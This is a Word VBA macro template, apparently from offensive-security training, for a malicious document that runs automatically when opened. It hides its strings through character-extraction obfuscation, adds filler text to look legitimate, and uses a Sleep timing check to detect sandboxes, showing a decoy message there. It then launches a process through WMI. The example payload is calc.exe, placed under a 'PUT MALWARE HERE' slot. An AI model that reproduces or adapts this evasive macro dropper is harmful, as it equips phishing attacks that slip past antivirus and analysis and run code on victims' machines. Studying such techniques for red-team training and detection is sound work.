Dim para As String
Dim k, b, c, d, j, f, g, h, l, ca As String

Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal zzzz As Long) As Long

Sub Document_Open()
    {MACRO_NAME}
End Sub

Sub AutoOpen()
    {MACRO_NAME}
End Sub

Function midget()
    midget = Now()
End Function

Sub crapper()
    Sleep (2105)
End Sub

Function zoot()
    zoot = midget
End Function

Sub {MACRO_NAME}()
    
    

    'Arbitrary document interaction seem more legitimate
    Selection.Font.Color = wdColorBlack
    ActiveDocument.Content.InsertAfter "PROTECTED-MESSAGE" & vbCrLf


    For i = 0 To 1000 Step 1
        para = RandomAlphabetString()

        If i = 37 Then
            k = Mid$(para, CharIndex("i", para) + 1, 1)
        End If

        If i = 47 Then
            b = Mid$(para, CharIndex("e", para) + 1, 1)
        End If

        If i = 67 Then
            c = Mid$(para, CharIndex("u", para) + 1, 1)
        End If

        If i = 57 Then
            d = Mid$(para, CharIndex("o", para) + 1, 1)
        End If

        If i = 99 Then
            j = Mid$(para, CharIndex("a", para) + 1, 1)
        End If
        
        If i = 199 Then
            f = Mid$(para, CharIndex("m", para) + 1, 1)
        End If
        
        If i = 12 Then
            g = Mid$(para, CharIndex("t", para) + 1, 1)
        End If
        
        If i = 120 Then
            h = Mid$(para, CharIndex("x", para) + 1, 1)
        End If
        
        If i = 123 Then
            l = Mid$(para, CharIndex("s", para) + 1, 1)
        End If

        ActiveDocument.Content.InsertAfter Mid$(para, 1, 1)

        If i Mod 20 = 0 Then
            DoEvents
        End If
        
        If i = 317 Then
            
            'Time stuff
            Dim bryant As Date
            Dim kobe As Date
            Dim hanz_zimmer As Long
            kobe = midget
            crapper
            bryant = zoot
            hanz_zimmer = DateDiff("s", kobe, bryant)
            
            If i = 1 Then
                ca = ""

            End If

            If hanz_zimmer < 1 Then
                ca = "W" & b & "lc" & d & "" & f & "" & b & " " & g & "" & d & " " & g & "h" & b & " C" & j & "" & l & "" & g & "l" & b & " An" & g & "hr" & j & "" & h & ""
                MsgBox (ca)
                Exit Sub
            End If
            
            If ActiveDocument.Name <> "OSEPC.doc" Then
                Exit Sub
            End If
        
            'PUT MALWARE HERE
            'Use the VBA String Obfuscator tool to break up strings.
            
            'Example open calc
            Dim malware As String
            malware = "c" & j & "lc." & b & "" & h & "" & b & ""
            GetObject("winmgmts:").Get("Win32_Process").Create malware, pidgeon, swallow, tarpin
            
            
        End If

    Next i

    ActiveDocument.Content.InsertAfter vbCrLf


End Sub

Function CharIndex(ByVal ch As String, ByVal chars As String) As Long

    CharIndex = InStr(1, chars, ch, vbBinaryCompare)
    If CharIndex = 0 Then
        CharIndex = -1
    Else
        CharIndex = CharIndex - 1
    End If
End Function

Function RandomAlphabetString(Optional ByVal ExtraChars As Long = 0) As String
    Dim chars As String
    Dim arr() As String
    Dim i As Long, j As Long
    Dim tmp As String

    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

    ReDim arr(1 To Len(chars) + ExtraChars)

    For i = 1 To Len(chars)
        arr(i) = Mid$(chars, i, 1)
    Next i

    Randomize
    For i = Len(chars) + 1 To UBound(arr)
        j = Int(Rnd() * Len(chars)) + 1
        arr(i) = Mid$(chars, j, 1)
    Next i

    For i = UBound(arr) To 2 Step -1
        j = Int(Rnd() * i) + 1
        tmp = arr(i)
        arr(i) = arr(j)
        arr(j) = tmp
    Next i

    For i = 1 To UBound(arr)
        RandomAlphabetString = RandomAlphabetString & arr(i)
    Next i
End Function


